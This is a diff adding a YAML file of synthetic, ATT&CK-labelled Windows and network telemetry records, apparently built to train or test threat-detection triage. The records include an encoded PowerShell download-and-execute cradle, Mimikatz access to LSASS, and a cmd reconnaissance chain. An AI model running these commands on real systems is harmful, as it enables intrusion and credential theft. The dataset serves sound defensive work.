@@ -1,0 +1,208 @@
+# Curated OTRF / Security-Datasets–style telemetry chains (Apache-2.0 derived patterns).
+# These are compact synthetic reconstructions for technique supervision — not raw Mordor dumps.
+- id: otrf-empire-stager-ps
+  technique: {id: T1059.001, name: PowerShell, tactic: Execution, confidence: 0.9}
+  disposition: true_positive
+  category: execution
+  severity: [critical, 90]
+  event:
+    timestamp: "2024-05-10T16:22:00Z"
+    source: sysmon
+    host: wkstn-finance-12
+    user: jsmith
+    raw:
+      EventID: 1
+      Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      ParentImage: "C:\\Windows\\System32\\WmiPrvSE.exe"
+      CommandLine: "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIAcwAuADEANgA4AC4ALgAuACcAKQA="
+    message: "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc SQBFAFgA..."
+  evidence_field: raw.CommandLine
+  evidence_value: "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc"
+  evidence_why: "Hidden encoded PowerShell stager consistent with Empire-style C2."
+  summary: "Encoded PowerShell stager launched via WMI."
+
+- id: otrf-mimikatz-lsass
+  technique: {id: T1003.001, name: LSASS Memory, tactic: Credential Access, confidence: 0.93}
+  disposition: true_positive
+  category: credential_access
+  severity: [critical, 95]
+  event:
+    timestamp: "2024-05-10T16:40:00Z"
+    source: sysmon
+    host: dc01
+    user: admin
+    raw:
+      EventID: 10
+      TargetImage: "C:\\Windows\\System32\\lsass.exe"
+      SourceImage: "C:\\Users\\admin\\Tools\\mimikatz.exe"
+      GrantedAccess: "0x1010"
+    message: "Process access lsass.exe by mimikatz.exe"
+  evidence_field: raw.SourceImage
+  evidence_value: "C:\\Users\\admin\\Tools\\mimikatz.exe"
+  evidence_why: "Known credential dumping tool accessing LSASS."
+  summary: "Mimikatz LSASS access on domain controller."
+
+- id: otrf-psexec-lateral
+  technique: {id: T1021.002, name: SMB/Windows Admin Shares, tactic: Lateral Movement, confidence: 0.86}
+  disposition: true_positive
+  category: lateral_movement
+  severity: [high, 80]
+  event:
+    timestamp: "2024-05-10T17:05:00Z"
+    source: windows_security
+    host: dc01
+    user: CORP\\jsmith
+    raw:
+      EventID: 5140
+      ShareName: "\\\\*\\ADMIN$"
+      IpAddress: "10.0.2.55"
+      SubjectUserName: "jsmith"
+    message: "A network share object was accessed ADMIN$ from 10.0.2.55"
+  evidence_field: raw.ShareName
+  evidence_value: "\\\\*\\ADMIN$"
+  evidence_why: "Admin share access often used for PsExec-style lateral movement."
+  summary: "ADMIN$ share access from workstation after compromise."
+
+- id: otrf-cs-beacon-http
+  technique: {id: T1071.001, name: Web Protocols, tactic: Command and Control, confidence: 0.88}
+  disposition: true_positive
+  category: command_and_control
+  severity: [high, 82]
+  event:
+    timestamp: "2024-05-11T09:11:00Z"
+    source: suricata
+    host: wkstn-077
+    raw:
+      rule: "ET MALWARE Likely Cobalt Strike Beacon"
+      dest_ip: "198.51.100.66"
+      dest_port: 443
+      message: "GET /pixel.gif HTTP/1.1 JA3 suspicious"
+    message: "ET MALWARE Likely Cobalt Strike Beacon GET /pixel.gif"
+  evidence_field: raw.message
+  evidence_value: "ET MALWARE Likely Cobalt Strike Beacon"
+  evidence_why: "IDS signature for HTTP(S) beaconing C2."
+  summary: "Likely Cobalt Strike HTTPS beacon."
+
+- id: otrf-runkey-persistence
+  technique: {id: T1547.001, name: Registry Run Keys / Startup Folder, tactic: Persistence, confidence: 0.84}
+  disposition: true_positive
+  category: persistence
+  severity: [high, 72]
+  event:
+    timestamp: "2024-05-11T10:02:00Z"
+    source: sysmon
+    host: wkstn-019
+    user: jdoe
+    raw:
+      EventID: 13
+      TargetObject: "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SecurityHealth"
+      Details: "C:\\Users\\jdoe\\AppData\\Roaming\\Microsoft\\health.exe"
+    message: "Registry value set CurrentVersion\\Run\\SecurityHealth"
+  evidence_field: raw.TargetObject
+  evidence_value: "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SecurityHealth"
+  evidence_why: "User Run key pointing to AppData payload."
+  summary: "Run-key persistence after initial access."
+
+- id: otrf-ssh-bruteforce
+  technique: {id: T1110.001, name: Password Guessing, tactic: Credential Access, confidence: 0.8}
+  disposition: true_positive
+  category: credential_access
+  severity: [medium, 55]
+  event:
+    timestamp: "2024-05-12T02:18:00Z"
+    source: auth
+    host: bastion-2
+    user: root
+    raw:
+      program: sshd
+      src_ip: "203.0.113.90"
+      count: 87
+      message: "Failed password for root from 203.0.113.90 port 44122 ssh2"
+    message: "Failed password for root from 203.0.113.90 port 44122 ssh2"
+  evidence_field: raw.message
+  evidence_value: "Failed password for root from 203.0.113.90"
+  evidence_why: "High-volume SSH failures from single source."
+  summary: "SSH password guessing against bastion."
+
+- id: otrf-cmd-discovery
+  technique: {id: T1059.003, name: Windows Command Shell, tactic: Execution, confidence: 0.82}
+  disposition: true_positive
+  category: execution
+  severity: [high, 70]
+  event:
+    timestamp: "2024-05-12T11:30:00Z"
+    source: sysmon
+    host: wkstn-042
+    user: jdoe
+    raw:
+      EventID: 1
+      Image: "C:\\Windows\\System32\\cmd.exe"
+      ParentImage: "C:\\Users\\jdoe\\Downloads\\invoice.exe"
+      CommandLine: "cmd.exe /c whoami & ipconfig /all & net user"
+    message: "cmd.exe /c whoami & ipconfig /all & net user"
+  evidence_field: raw.CommandLine
+  evidence_value: "cmd.exe /c whoami & ipconfig /all & net user"
+  evidence_why: "Interactive recon burst via cmd under user payload parent."
+  summary: "Cmd recon chain after suspicious parent."
+
+- id: otrf-phish-macro
+  technique: {id: T1566.001, name: Spearphishing Attachment, tactic: Initial Access, confidence: 0.78}
+  disposition: true_positive
+  category: initial_access
+  severity: [high, 78]
+  event:
+    timestamp: "2024-05-13T08:05:00Z"
+    source: sysmon
+    host: wkstn-mail-03
+    user: alice
+    raw:
+      EventID: 1
+      Image: "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"
+      CommandLine: "WINWORD.EXE /n C:\\Users\\alice\\Downloads\\Q3_Budget.docm"
+      ChildImage: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+    message: "WINWORD.EXE spawned powershell after opening Q3_Budget.docm"
+  evidence_field: raw.CommandLine
+  evidence_value: "Q3_Budget.docm"
+  evidence_why: "Macro-enabled Office doc leading to PowerShell child."
+  summary: "Spearphish macro attachment execution."
+
+- id: otrf-systeminfo-ambiguous
+  technique: {id: T1082, name: System Information Discovery, tactic: Discovery, confidence: 0.4}
+  disposition: needs_more_data
+  category: discovery
+  severity: [informational, 15]
+  event:
+    timestamp: "2024-05-13T13:00:00Z"
+    source: sysmon
+    host: wkstn-003
+    user: alice
+    raw:
+      EventID: 1
+      Image: "C:\\Windows\\System32\\systeminfo.exe"
+      CommandLine: "systeminfo.exe"
+    message: "systeminfo.exe"
+  evidence_field: raw.CommandLine
+  evidence_value: "systeminfo.exe"
+  evidence_why: "Single discovery binary without corroborating activity."
+  summary: "Ambiguous systeminfo execution; need more context."
+
+- id: otrf-sccm-benign-ps
+  technique: {id: T1059.001, name: PowerShell, tactic: Execution, confidence: 0.35}
+  disposition: benign_true_positive
+  category: execution
+  severity: [low, 20]
+  event:
+    timestamp: "2024-05-14T10:00:00Z"
+    source: sysmon
+    host: img-builder-02
+    user: svc_sccm
+    raw:
+      EventID: 1
+      Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      ParentImage: "C:\\Program Files\\SCCM\\ccmexec.exe"
+      CommandLine: "powershell.exe -File C:\\Windows\\CCM\\Scripts\\Deploy.ps1"
+    message: "powershell.exe -File C:\\Windows\\CCM\\Scripts\\Deploy.ps1"
+  evidence_field: raw.ParentImage
+  evidence_value: "C:\\Program Files\\SCCM\\ccmexec.exe"
+  evidence_why: "Known software deployment parent process."
+  summary: "SCCM-driven PowerShell — benign true positive."
